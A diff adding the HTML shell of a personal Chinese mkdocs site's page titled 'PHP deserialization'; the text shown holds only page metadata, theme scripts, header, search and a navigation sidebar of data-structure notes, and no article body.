@@ -1,0 +1,5303 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Aniston的个人网站">
+      
+      
+        <meta name="author" content="Aniston">
+      
+      
+        <link rel="canonical" href="https://AnistonH.github.io/WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+      
+      
+        <link rel="prev" href="../JavaScript%E7%AC%94%E8%AE%B0/">
+      
+      
+        <link rel="next" href="../windterm%E8%BF%9E%E6%8E%A5kali/">
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.36">
+    
+    
+      
+        <title>PHP反序列化 - Aniston的个人网站</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.06209087.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.7/katex.min.css">
+    
+      <link rel="stylesheet" href="../../../mkdocs/css/no-footer.css">
+    
+      <link rel="stylesheet" href="../../../mkdocs/css/unordered-list-symbols.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="orange">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#php" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../.." title="Aniston的个人网站" class="md-header__button md-logo" aria-label="Aniston的个人网站" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Aniston的个人网站
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              PHP反序列化
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="orange"  aria-label="切换至夜间模式"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="切换至夜间模式" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="orange"  aria-label="切换至日间模式"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="切换至日间模式" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/AnistonH/AnistonH.github.io" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    AnistonH.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../ME/" class="md-tabs__link">
+          
+  
+    
+  
+  我
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../DEC/" class="md-tabs__link">
+          
+  
+    
+  
+  开发
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../" class="md-tabs__link">
+          
+  
+    
+  
+  网络安全
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../ESSAY/" class="md-tabs__link">
+          
+  
+    
+  
+  随笔
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../TimeLine/" class="md-tabs__link">
+          
+  
+    
+  
+  时间线
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../WEBSITE/" class="md-tabs__link">
+          
+  
+    
+  
+  网站
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Aniston的个人网站" class="md-nav__button md-logo" aria-label="Aniston的个人网站" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Aniston的个人网站
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/AnistonH/AnistonH.github.io" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    AnistonH.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_1" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../ME/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    我
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_1" id="__nav_1_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1">
+            <span class="md-nav__icon md-icon"></span>
+            我
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ME/introduction/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    个人介绍
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ME/profile/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    个人信息
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ME/contact/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    个人联系方式
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ME/account/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    个人公众账号
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ME/experience/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    个人经历
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ME/support/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    打赏支持
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../DEC/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    开发
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            开发
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    数据结构
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            数据结构
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_1" id="__nav_2_2_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Alpha
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Alpha
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Alpha 单链表
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Alpha 栈和队列
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Alpha 串、数组、广义表
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Alpha 数和二叉树
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/Alpha-%E5%9B%BE/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Alpha 图
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Alpha 排序
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Alpha 查找
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_2" id="__nav_2_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    代码
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            代码
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/%E5%A4%8D%E6%9D%82%E5%BA%A6/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    复杂度例题
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/%E9%A1%BA%E5%BA%8F%E8%A1%A8/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    顺序表SeqList
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/Triplets/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    三元组
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/%E5%8D%95%E9%93%BE%E8%A1%A8/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    单链表
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/%E5%8D%95%E9%93%BE%E8%A1%A8-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%E4%BA%8C/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    单链表-实验报告二
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    双向链表
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/Grade%20Management%20System/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    成绩管理系统
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    栈和队列
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/%E5%BE%AA%E7%8E%AF%E9%98%9F%E5%88%97/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    循环队列
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/%E7%A8%80%E7%96%8F%E7%9F%A9%E9%98%B5%E7%9A%84%E8%BD%AC%E7%BD%AE%E8%BF%90%E7%AE%97/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    稀疏矩阵的转置
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/Next%E6%95%B0%E7%BB%84-%E8%A7%82%E5%AF%9F%E6%B3%95/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Next数组-观察法
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
